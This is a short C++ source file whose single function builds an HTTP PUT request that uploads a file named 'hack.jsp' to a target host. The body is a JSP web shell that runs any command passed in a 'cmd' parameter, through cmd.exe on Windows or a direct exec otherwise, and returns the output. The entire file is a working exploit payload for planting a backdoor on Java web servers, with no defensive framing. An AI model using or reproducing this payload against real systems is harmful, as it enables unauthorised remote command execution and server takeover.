#include "hdr.h"

string getPayload(string host) {
    string payload;
    payload += "PUT /hack.jsp/ HTTP/1.1\r\n";
    payload += "Host: " + host + "\r\n";
    payload += "Content-Length: 554\r\n\r\n";
    payload += "<%@ page import=\"java.util.*,java.io.*\"%>";
    payload += " <% %> ";
    payload += "<% if (request.getParameter(\"cmd\") != null) { ";
    payload += "Process p; ";
    payload += "if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ ";
    payload += "p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); ";
    payload += "} else{ ";
    payload += "p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); ";
    payload += "} OutputStream os = p.getOutputStream(); ";
    payload += "InputStream in = p.getInputStream(); ";
    payload += "DataInputStream dis = new DataInputStream(in); ";
    payload += "String disr = dis.readLine(); ";
    payload += "while ( disr != null ) { ";
    payload += "out.println(disr); ";
    payload += "disr = dis.readLine(); ";
    payload += "} } ";
    payload += "%> ";
    return payload;
}